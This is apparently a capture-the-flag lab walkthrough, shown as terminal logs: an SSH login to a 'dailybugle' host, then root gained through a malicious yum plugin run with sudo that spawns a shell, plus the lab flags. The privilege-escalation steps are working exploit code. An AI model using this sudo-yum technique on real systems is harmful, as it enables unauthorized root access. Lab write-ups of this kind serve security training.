<img width="937" height="117" alt="image" src="https://github.com/user-attachments/assets/148ced0e-53da-4e91-8a1a-8ccf41b7334d" />

```
┌──(kali㉿kali)-[~]
└─$ ssh jjameson@10.112.159.129
jjameson@10.112.159.129's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ ls -al
total 16
drwx------. 2 jjameson jjameson  99 Dec 15  2019 .
drwxr-xr-x. 3 root     root      22 Dec 14  2019 ..
lrwxrwxrwx  1 jjameson jjameson   9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--. 1 jjameson jjameson  18 Aug  8  2019 .bash_logout
-rw-r--r--. 1 jjameson jjameson 193 Aug  8  2019 .bash_profile
-rw-r--r--. 1 jjameson jjameson 231 Aug  8  2019 .bashrc
-rw-rw-r--  1 jjameson jjameson  33 Dec 15  2019 user.txt
```
```
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
```

```
[jjameson@dailybugle /]$ TF=$(mktemp -d)
[jjameson@dailybugle /]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle /]$ 
[jjameson@dailybugle /]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
```

```
sh-4.2# whoami
root
```
```
sh-4.2# ls
bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
```
```
sh-4.2# cd root
sh-4.2# ls
anaconda-ks.cfg  root.txt
```
```
sh-4.2# cat root.txt
eec3d53292b1821868266858d7fa6f79
```
